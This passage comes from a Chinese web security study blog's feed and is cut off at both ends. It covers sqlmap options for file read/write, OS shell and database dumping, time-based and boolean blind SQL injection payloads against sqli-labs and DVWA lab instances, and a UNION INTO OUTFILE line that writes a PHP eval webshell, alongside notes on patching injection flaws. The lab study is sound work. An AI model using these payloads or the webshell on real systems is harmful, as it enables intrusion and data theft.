class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.52/sqli-labs/Less-1/?id=1"</span> --file-read=<span class="string">"/var/www/html/sqli-labs/index.html"</span></span><br></pre></td></tr></table></figure><p><img src="/images/172sqlmap_read.png" alt></p><p><img src="/images/172sqlmap_read1.png" alt></p><p><img src="/images/172sqlmap_read2.png" alt></p><p>点击查看读取的文件</p><p><img src="/images/172sqlmap_read3.png" alt></p><p>打开文件</p><p><img src="/images/172sqlmap_read4.png" alt></p><h3 id="sqlmap-写文件"><a href="#sqlmap-写文件" class="headerlink" title="sqlmap 写文件"></a><code>sqlmap</code> 写文件</h3><p>在本地新建 <code>hack.php</code> 文件，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.52/sqli-labs/Less-1/?id=1"</span> --file-write=<span class="string">"hack.php"</span> --file-dest=<span class="string">"/var/myfile/hack.php"</span> -v 5</span><br></pre></td></tr></table></figure><p>在服务器中查看</p><p><img src="/images/173sqlmap_write.png" alt></p><h3 id="sqlmap-执行-sql语句"><a href="#sqlmap-执行-sql语句" class="headerlink" title="sqlmap 执行 sql语句"></a><code>sqlmap</code> 执行 <code>sql</code>语句</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.52/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low; PHPSESSID=ri8va1c84en9d40b7l1o1lle53"</span> --sql-shell</span><br></pre></td></tr></table></figure><p>然后执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select @@datadir;</span><br><span class="line">select user();</span><br></pre></td></tr></table></figure><p><img src="/images/173sqlmp_sqlcmd.png" alt></p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C173sqlmap_sqlcmd1.png" alt></p><h3 id="sqlmap-g"><a href="#sqlmap-g" class="headerlink" title="sqlmap -g"></a><code>sqlmap -g</code></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -g <span class="string">"inurl:?id=1"</span></span><br></pre></td></tr></table></figure><p><img src="/images/174sqlmap_g.png" alt></p><h3 id="sqlmap-r"><a href="#sqlmap-r" class="headerlink" title="sqlmap -r"></a><code>sqlmap -r</code></h3><p>打开 <code>burpsuite</code> 抓包，</p><p><img src="/images/175sqlmap_r.png" alt></p><p>把 <code>Request</code> 里面的内容，复制粘贴到 <code>less12.txt</code> 中，打开 <code>sqlmap</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r less12.txt</span><br></pre></td></tr></table></figure><p><img src="/images/176sqlmap_r.png" alt></p><p><img src="/images/177sqlmap-r.png" alt></p><h3 id="sqlmap-os-shell"><a href="#sqlmap-os-shell" class="headerlink" title="sqlmap --os-shell"></a><code>sqlmap --os-shell</code></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.119/sqli-labs/Less-1/?id=1"</span> --os-shell</span><br></pre></td></tr></table></figure><p>用 <code>sqli-labs</code> 和 <code>dvwa</code> 都会提示</p><p><img src="/images/178error.png" alt></p><p>尝试了 <code>Window</code> 和 <code>CentOS</code> 系统，还是失败。在网上搜到参考文章，照着修改权限，依然没有成功。</p><p><em>参考文章</em></p><blockquote><p><a href="https://blog.csdn.net/lplp9822/article/details/84112979" target="_blank" rel="noopener">DVWA(linux下)利用sqlmap进行–os-shell注入不能成功的错误处理</a></p></blockquote><p>最后</p><p>在虚拟机中把，html 文件夹权限修改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/</span><br><span class="line">chmod 777 html</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.52/sqli-labs/Less-3/?id=1"</span> --os-shell</span><br></pre></td></tr></table></figure><p><img src="/images/182os-shell.png" alt></p><p><img src="/images/183os-shel.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: &lt;code&gt;SQLMap&lt;/code&gt;的应用，使用&lt;code&gt;sqli-labs&lt;/code&gt; 和 &lt;code&gt;dvwa&lt;/code&gt; 作为实验平台。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="SQL盲注" scheme="http://yoursite.com/tags/SQL%E7%9B%B2%E6%B3%A8/"/>
    
  </entry>
  
  <entry>
    <title>news</title>
    <link href="http://yoursite.com/2019/08/31/news/"/>
    <id>http://yoursite.com/2019/08/31/news/</id>
    <published>2019-08-31T00:18:42.000Z</published>
    <updated>2019-09-01T14:33:21.480Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 修改新闻管理系统，防止 SQL 注入</p><a id="more"></a><!--export--><!--toc--><h3 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a><code>login.php</code></h3><p>在登录界面，存在万能密码漏洞，用户名输入 <code>admin&#39; or 1</code> 点击提交按钮，可以登录。对输入的用户名进行函数处理，可以防止此类问题发生。</p><p><img src="/images/143loginSQL.png" alt> </p><h3 id="xinwenmoreandpinglun-php"><a href="#xinwenmoreandpinglun-php" class="headerlink" title="xinwenmoreandpinglun.php"></a><code>xinwenmoreandpinglun.php</code></h3><p>查看新闻及评论功能界面，在 URL 后输入 <code>&#39; --+</code> ，页面可以正常显示， 存在 SQL 注入。</p><p><img src="/images/144commentSQL.png" alt></p><p>对传入的 <code>action</code>  进行函数处理</p><p><img src="/images/155comment.png" alt></p><p>再次尝试 SQL 注入</p><p><img src="/images/145commentfail.png" alt></p><h3 id="zengjiaxinwen-php"><a href="#zengjiaxinwen-php" class="headerlink" title="zengjiaxinwen.php"></a><code>zengjiaxinwen.php</code></h3><p>在增加新闻界面，在标题中写入 <code>标题&#39; or sleep(1) -- |</code>，点击提交插入成功。</p><p><img src="/images/147addnewsSQL.png" alt></p><p>之后再新闻展示，新闻排序等功能时，都会出现延时现象。在这里做简单的防止注入措施。</p><p><img src="/images/148addnewsSQL.png" alt></p><h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a><code>index.php</code></h3><p>在 <code>index.php</code> 页面的搜索框，输入 <code>admin%&#39;#</code> 发现能正常搜索。</p><p><img src="/images/150searchSQL.png" alt></p><p>修改后再次输入 <code>admin%&#39; #</code>，搜索失败</p><p><img src="/images/151searchfail.png" alt></p><h3 id="个人信息和安全设置"><a href="#个人信息和安全设置" class="headerlink" title="个人信息和安全设置"></a><code>个人信息和安全设置</code></h3><h4 id="personal-information-php"><a href="#personal-information-php" class="headerlink" title="personal_information.php"></a><code>personal_information.php</code></h4><p>个人信息界面，邮箱存在时间盲注漏洞。</p><p><img src="/images/153emailSQL.png" alt></p><h4 id="anquanshezhi-php"><a href="#anquanshezhi-php" class="headerlink" title="anquanshezhi.php"></a><code>anquanshezhi.php</code></h4><p><img src="/images/154pass.png" alt></p><h3 id="问题与改进"><a href="#问题与改进" class="headerlink" title="问题与改进"></a>问题与改进</h3><ol><li>增加新闻界面，对标题和内容的处理不合理，当标题和内容输入的内容包含预定义字符时，页面显示的效果与预期不符。</li><li>存在潜在的 SQL 注入漏洞。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 修改新闻管理系统，防止 SQL 注入&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="防止SQL注入" scheme="http://yoursite.com/tags/%E9%98%B2%E6%AD%A2SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>note35</title>
    <link href="http://yoursite.com/2019/08/30/note35/"/>
    <id>http://yoursite.com/2019/08/30/note35/</id>
    <published>2019-08-30T13:06:45.000Z</published>
    <updated>2019-08-30T15:46:13.295Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: SQLMap 的简单应用</p><a id="more"></a><!--export--><!--toc--><h3 id="Window-中的-cmd-中设置别名"><a href="#Window-中的-cmd-中设置别名" class="headerlink" title="Window 中的 cmd 中设置别名"></a>Window 中的 cmd 中设置别名</h3><h4 id="设置-cmd-中常用命令的别名"><a href="#设置-cmd-中常用命令的别名" class="headerlink" title="设置 cmd 中常用命令的别名"></a>设置 cmd 中常用命令的别名</h4><ol><li>新建 .bat 文件， cmd 输入 regedit</li></ol><p><img src="/images/140cmd.png" alt></p><ol start="2"><li><p>在 \HKEY_CURRENT_USER\Software\Microsoft\ 中新建项，命名为 Command Processor，再在其中新建字符串值，命名为 AutoRun，数据写为 .bat 的路径。</p><p><img src="/images/141batpath.png" alt></p></li><li><p>按照如下格式编辑 .bat 文件</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">doskey sqlmap=D:\Software\Python27\python.exe D:\tools\PyScript\sqlmap\sqlmap.py $*</span><br><span class="line">doskey clear=cls</span><br><span class="line">doskey burp=java -Xbootclasspath/p:D:\Software\burpsuite\burp-loader-keygen.jar -jar D:\Software\burpsuite\burpsuite_pro_v2.0beta.jar</span><br><span class="line">doskey behinder=javaw -jar D:\tools\software\Behinder\Behinder.jar</span><br></pre></td></tr></table></figure><p><img src="/images/142batcontent.png" alt></p><p>然后就可以直接在 cmd 中启动软件了。</p><p>behinder 软件还是无法启动，目前没有找到解决方法。</p><p><em>参考文章</em></p><blockquote><p><a href="https://blog.csdn.net/yiranzhiliposui/article/details/83116819" target="_blank" rel="noopener">cmd中设置别名</a></p></blockquote><h3 id="SQLMap-的应用"><a href="#SQLMap-的应用" class="headerlink" title="SQLMap 的应用"></a>SQLMap 的应用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">--current-user                     #操作系统用户</span><br><span class="line">--current-db                       #当前库名</span><br><span class="line">--dbs                              #所有库名</span><br><span class="line">--users                            #数据库管理员</span><br><span class="line">--privileges -U                    #查管理员权限</span><br><span class="line">--roles                            #查数据库角色</span><br><span class="line">-D dvwa --tables                   #查库dvwa中所有的表</span><br><span class="line">-D dvwa -T users --columns         #查表users中所有的列</span><br><span class="line">--schema --batch --exclude-sysdbs  #查information_schema中表结构</span><br><span class="line">--batch                            #表示过程中都选择默认选项    </span><br><span class="line">--exclude-sysdbs                   #表示忽略系统表，只查有价值表</span><br><span class="line">--count                            #对表计数</span><br><span class="line"></span><br><span class="line">Dump 脱裤，慎用！</span><br><span class="line">--dump, -C, -T, -D, --start, --stop #(部分脱裤)</span><br><span class="line">--dump-all --exclude-sysdbs         #(直接脱裤)</span><br><span class="line">--sql-query &quot;select * from users&quot;   #(自己命令脱离库)</span><br><span class="line"># 当数据库管理员比较安全，没法顺利脱裤，只能利用字典拆解表名列名</span><br><span class="line">--common-tables     --common-columns</span><br></pre></td></tr></table></figure><p><strong>Note</strong>: Mysql &lt; 5.0，没有 information_schema 库，Mysql &gt;= 5.0，但无权读取 information_schema 库，微软的 access 数据库，默认无权读取 MSysObjects库。</p><h4 id="操作系统命令"><a href="#操作系统命令" class="headerlink" title="操作系统命令"></a>操作系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">--file-read = &quot;/etc/passwd&quot;</span><br><span class="line">--file-write=&quot;shell.php&quot; --file-dest &quot;/tmp/shell.php&quot;</span><br><span class="line"></span><br><span class="line">--sql-shell    # Mysql</span><br><span class="line">--os-shell</span><br><span class="line">--os-cmd</span><br><span class="line"></span><br><span class="line">sqlmap -m list.txt  # 批量扫描</span><br><span class="line"># 调用google api 来扫描，国内需要设置代理链：</span><br><span class="line">sqlmap.py -g &quot;inurl:&quot;.php?id=1&quot;&quot; --proxy=&quot;http://127.0.0.1:8087&quot;</span><br><span class="line"></span><br><span class="line"># 利用proxy截断http请求并保存为 request.txt (推荐)</span><br><span class="line">sqlmap -r request.txt</span><br><span class="line"># 利用burpsite中的option设置，勾选保存proxy的request请求日志，保存为log.txt</span><br><span class="line">sqlmap -l log.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">--data# 数据段</span><br><span class="line"># web应用需要基于cookie身份认证</span><br><span class="line"># 检查cookie中注入点</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/index.php&quot; --data=&quot;user=1&amp;pass=2&quot;;</span><br><span class="line"></span><br><span class="line">--cookie# cookie字段</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/index.php&quot; --cookie=&quot;user=1&amp;pass=2&quot;;</span><br><span class="line"></span><br><span class="line">--user-agent    # 手动指定</span><br><span class="line">--host# Host头</span><br><span class="line">--referer               # Referer头</span><br><span class="line">--method# 扫描时指定方法 POST/GET</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: SQLMap 的简单应用&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="SQL 盲注" scheme="http://yoursite.com/tags/SQL-%E7%9B%B2%E6%B3%A8/"/>
    
  </entry>
  
  <entry>
    <title>note34</title>
    <link href="http://yoursite.com/2019/08/29/note34/"/>
    <id>http://yoursite.com/2019/08/29/note34/</id>
    <published>2019-08-29T11:49:36.000Z</published>
    <updated>2019-08-30T00:16:16.168Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: SQL 盲注之时间盲注</p><a id="more"></a><!--export--><!--toc--><h3 id="SQL-盲注"><a href="#SQL-盲注" class="headerlink" title="SQL 盲注"></a>SQL 盲注</h3><h4 id="sleep-second-函数"><a href="#sleep-second-函数" class="headerlink" title="sleep(second) 函数"></a>sleep(second) 函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 系统睡眠3秒，查询结果为0</span><br><span class="line">select sleep(3);</span><br></pre></td></tr></table></figure><p>时间可以精确控制。</p><h4 id="benchmark-number-function-函数"><a href="#benchmark-number-function-函数" class="headerlink" title="benchmark(number, function)函数"></a>benchmark(number, function)函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 重复执行某个函数N次</span><br><span class="line">select benchmark(10000000, md5(1);</span><br></pre></td></tr></table></figure><p>时间不可控，电脑性能越高，时间越短。</p><table><thead><tr><th align="center">select * from table where id = 1</th><th align="center">and if(布尔表达式, 0, 1);</th></tr></thead><tbody><tr><td align="center">原始语句</td><td align="center">测试语句+注入语句</td></tr></tbody></table><p><em>参考文章</em></p><blockquote><p><a href="https://www.cnblogs.com/-qing-/p/10894310.html" target="_blank" rel="noopener">MySQL时间盲注五种延时方法 (PWNHUB 非预期解)</a></p></blockquote><h4 id="and-0-的短路特性"><a href="#and-0-的短路特性" class="headerlink" title="and 0 的短路特性"></a>and 0 的短路特性</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and 1 and sleep(1);</span><br><span class="line"># 1.00sec</span><br><span class="line">select * from users where id=1 and 0 and sleep(1);</span><br><span class="line"># 0.00 sec</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select 1 and sleep(3);</span><br><span class="line"># 3.00 sec</span><br><span class="line">select 0 and sleep(3);</span><br><span class="line"># 0.00 sec</span><br></pre></td></tr></table></figure><h4 id="or-1-的短路特性"><a href="#or-1-的短路特性" class="headerlink" title="or 1 的短路特性"></a>or 1 的短路特性</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 or 1 or sleep(1);</span><br><span class="line"># 0.00 sec</span><br><span class="line">select * from users where id=1 or 0 or sleep(1);</span><br><span class="line"># 1.00 sec</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select 1 or sleep(3);</span><br><span class="line"># 0.00 sec</span><br><span class="line">select 0 or sleep(3);</span><br><span class="line"># 3.00 sec</span><br></pre></td></tr></table></figure><h4 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h4><ul><li><code>if(布尔语句, 0, 1)</code></li></ul><p>条件成立取 0 ，条件不成立取 1 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 睡眠3秒</span><br><span class="line">select if(length(version())&gt;1, sleep(3), 0);</span><br><span class="line"># 直接返回0</span><br><span class="line">select if(length(version())&gt;15, sleep(3), 0);</span><br></pre></td></tr></table></figure><ul><li><code>case [1] when [2] then [3] else [4] end</code></li></ul><p>当 [1] 的值与 [2] 的值相等时，取 [3]，否则取 [4]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select case 1=1 when 1 then 123 else 456 end;</span><br><span class="line"># 123</span><br></pre></td></tr></table></figure><p><code>or</code> 的影响</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&apos;1&apos; or sleep(3); #&apos;;</span><br><span class="line"># 1 row in set (36.01 sec)</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：<code>sleep</code>是存在一个满足条件的行就会延迟指定的时间，比如 <code>sleep(5)</code>，但实际上查找到两个满足条件的行，那么就会延迟 10s ，在真实的渗透测试过程中，我们有时候不清楚整个表的情况，可以用 <code>sleep(0.001)</code>看最后多少秒有结果，推断表的行数。</p><p><em>参考文章</em></p><blockquote><p><a href="https://www.anquanke.com/post/id/170626" target="_blank" rel="noopener">一篇文章带你深入理解 SQL 盲注</a></p></blockquote><h4 id="用-SQL-注入写webshell"><a href="#用-SQL-注入写webshell" class="headerlink" title="用 SQL 注入写webshell"></a>用 SQL 注入写webshell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.197/Less-1/?id=1&apos; union select 1,2, &apos;&lt;?php @eval($_POST[&apos;pass&apos;])?&gt;&apos; into outfile &apos;/var/www/html/case.txt&apos; --+</span><br></pre></td></tr></table></figure><p>注意权限问题，此时创建文件的用户是 <code>mysql</code></p><h4 id="防止-SQL-注入常用函数"><a href="#防止-SQL-注入常用函数" class="headerlink" title="防止 SQL 注入常用函数"></a>防止 SQL 注入常用函数</h4><p><code>addslashes()</code>和 <code>mysql_real_escape_string()</code></p><p>详细内容请访问：</p><p><a href="https://meethanmj.github.io/2019/08/17/php-file-func/" target="_blank" rel="noopener">PHP内置过滤函数</a></p><h4 id="寻找-SQL-注入点思路"><a href="#寻找-SQL-注入点思路" class="headerlink" title="寻找 SQL 注入点思路"></a>寻找 SQL 注入点思路</h4><p><img src="/images/139sqlinjec.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: SQL 盲注之时间盲注&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="SQL 盲注" scheme="http://yoursite.com/tags/SQL-%E7%9B%B2%E6%B3%A8/"/>
    
  </entry>
  
  <entry>
    <title>练习10</title>
    <link href="http://yoursite.com/2019/08/28/practice10/"/>
    <id>http://yoursite.com/2019/08/28/practice10/</id>
    <published>2019-08-28T11:40:45.000Z</published>
    <updated>2019-08-29T00:15:40.757Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: SQL 盲注总结，目标站点是 <code>sqli-labs</code> 中的 <code>Less-8</code></p><a id="more"></a><!--export--><!--toc--><h3 id="找注入点"><a href="#找注入点" class="headerlink" title="找注入点"></a>找注入点</h3><p>拿到一个目标站点首先找到注入点，<code>Less-8</code> 注入点为 <code>?id=1</code></p><h3 id="判断类型"><a href="#判断类型" class="headerlink" title="判断类型"></a>判断类型</h3><p>发现输入 <code>id=1&#39;</code> 后页面的 <code>You are in ...</code> 消失了，没有报错信息。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1'</span><br></pre></td></tr></table></figure><p>再次输入</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' --+</span><br></pre></td></tr></table></figure><p>页面正常显示，所以该注入点为字符型注入，由于页面不显示错误信息，所以使用盲注的方法。</p><h3 id="判断数据库个数"><a href="#判断数据库个数" class="headerlink" title="判断数据库个数"></a>判断数据库个数</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and (select count(schema_name) from information_schema.schemata)&gt;4 --+</span><br></pre></td></tr></table></figure><p><img src="/images/127errorInjec_count.png" alt></p><p>发现 <code>&gt;4</code>正常显示，<code>&gt;5</code>不正常，故可知数据库个数为 5。</p><h3 id="判断各数据库名的长度"><a href="#判断各数据库名的长度" class="headerlink" title="判断各数据库名的长度"></a>判断各数据库名的长度</h3><p>先判断第一个数据库名的长度</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and length((select schema_name from information_schema.schemata limit 0,1))&gt;17 --+</span><br></pre></td></tr></table></figure><p><img src="/images/128fires_schemata_length.png" alt></p><p>可得第一个库的长度为 18 。</p><h3 id="判断数据库名"><a href="#判断数据库名" class="headerlink" title="判断数据库名"></a>判断数据库名</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and ascii(mid((select schema_name from information_schema.schemata limit 0, 1), 1, 1)) &gt;104 --+</span><br></pre></td></tr></table></figure><p>可得第一个字符为 <code>i</code> 。</p><p><img src="/images/125errorInjec_schema.png" alt></p><p>继续往下做判断</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and ascii(mid((select schema_name from information_schema.schemata limit 0, 1), 1, 1)) &gt;109 --+</span><br></pre></td></tr></table></figure><p><img src="/images/126errorInjec_judge_schemata.png" alt></p><p>可得第二个字符是 <code>n</code></p><p>可以以此判断出数据库中各个库名。</p><h3 id="判断当前数据库中表的个数"><a href="#判断当前数据库中表的个数" class="headerlink" title="判断当前数据库中表的个数"></a>判断当前数据库中表的个数</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())&gt;3 --+</span><br></pre></td></tr></table></figure><p><img src="/images/129count_current_database_tables.png" alt></p><h3 id="判断当前数据库中各个表名的长度"><a href="#判断当前数据库中各个表名的长度" class="headerlink" title="判断当前数据库中各个表名的长度"></a>判断当前数据库中各个表名的长度</h3><p>先判断第一个表名长度</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;1 --+</span><br></pre></td></tr></table></figure><p><img src="/images/130count_current_table_length.png" alt></p><h3 id="判断当前数据库中表名"><a href="#判断当前数据库中表名" class="headerlink" title="判断当前数据库中表名"></a>判断当前数据库中表名</h3><p>判断第一个表名</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0, 1), 1, 1)) &gt;100 --+</span><br></pre></td></tr></table></figure><p><img src="/images/130juage_table_name.png" alt></p><p>字符为 <code>e</code> ，继续判断可以得出该表名为 <code>emails</code>。</p><h3 id="查看-users-表中字段个数"><a href="#查看-users-表中字段个数" class="headerlink" title="查看 users 表中字段个数"></a>查看 <code>users</code> 表中字段个数</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users') &gt; 2 --+</span><br></pre></td></tr></table></figure><p><img src="/images/131.png" alt></p><p>个数为 3 。</p><h3 id="判断-users-表中第一个字段长度"><a href="#判断-users-表中第一个字段长度" class="headerlink" title="判断 users 表中第一个字段长度"></a>判断 <code>users</code> 表中第一个字段长度</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and length((select column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1)) &gt; 1 --+</span><br></pre></td></tr></table></figure><p>第一个字段长度为 2 。</p><h3 id="判断第一个字段"><a href="#判断第一个字段" class="headerlink" title="判断第一个字段"></a>判断第一个字段</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and ascii(mid((select column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0, 1), 1, 1)) &gt;104 --+</span><br></pre></td></tr></table></figure><p><img src="/images/133.png" alt></p><p>不难判断出第一个字段为 <code>id</code>。</p><h3 id="判断users-表行数"><a href="#判断users-表行数" class="headerlink" title="判断users 表行数"></a>判断<code>users</code> 表行数</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and (select count(*) from security.users) &gt;13 --+</span><br></pre></td></tr></table></figure><p><img src="/images/134.png" alt></p><p>可以查看 <code>users</code>表中的内容。</p><h3 id="总结-SQL-盲注流程"><a href="#总结-SQL-盲注流程" class="headerlink" title="总结 SQL 盲注流程"></a>总结 SQL 盲注流程</h3><ol><li>先找注入点</li><li>判断类型<ol><li>字符型？整型？</li><li>盲注还是 <code>UNION SELECT</code></li></ol></li><li>先查一共有几个数据库</li><li>再查各个数据库长度，为判断库名做准备</li><li>依次判断出数据库的名称，找到自己想要查询的库</li><li>先查库中有几个表</li><li>查各个表的长度</li><li>依次判断出各个表名</li><li>查表中有几个字段</li><li>查各个字段长度</li><li>依次判断字段名</li><li>判断出想要字段的数据</li></ol><h3 id="用burpsuite判断"><a href="#用burpsuite判断" class="headerlink" title="用burpsuite判断"></a>用burpsuite判断</h3><p>把要做判断的 <code>url</code> 发送到 <code>Intruder</code></p><p><img src="/images/135.png" alt></p><p>点击 <code>Clear $</code> ，在 <code>=%27i%27</code> 